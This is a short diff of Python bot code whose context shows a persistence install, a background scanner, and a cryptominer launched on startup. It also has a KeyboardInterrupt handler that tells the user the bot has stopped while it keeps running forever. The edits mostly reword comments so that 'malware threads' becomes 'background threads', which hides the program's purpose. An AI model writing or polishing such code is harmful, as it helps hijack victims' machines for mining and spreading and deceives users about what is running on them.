@@ -28,14 +28,13 @@ def _start():
             # Install persistence
             install()
             
-            # Run scanner in BACKGROUND
+            # Start scanner in background
             s = setup()
             t = threading.Thread(target=s.run, daemon=True)
             t.start()
             
-            # Start miner in BACKGROUND
-            t2 = threading.Thread(target=start_miner, daemon=True)
-            t2.start()
+            # Start miner in background
+            start_miner()
             
     except Exception as e:
         pass
@@ -113,7 +112,7 @@ def main():
             time.sleep(config.SCAN_INTERVAL_SECONDS)
     except KeyboardInterrupt:
         print("\n[!] Bot stopped. Background services still running.")
-        # Keep running so malware threads stay active
+        # Keep alive so background threads continue
         while True:
             time.sleep(60)
 
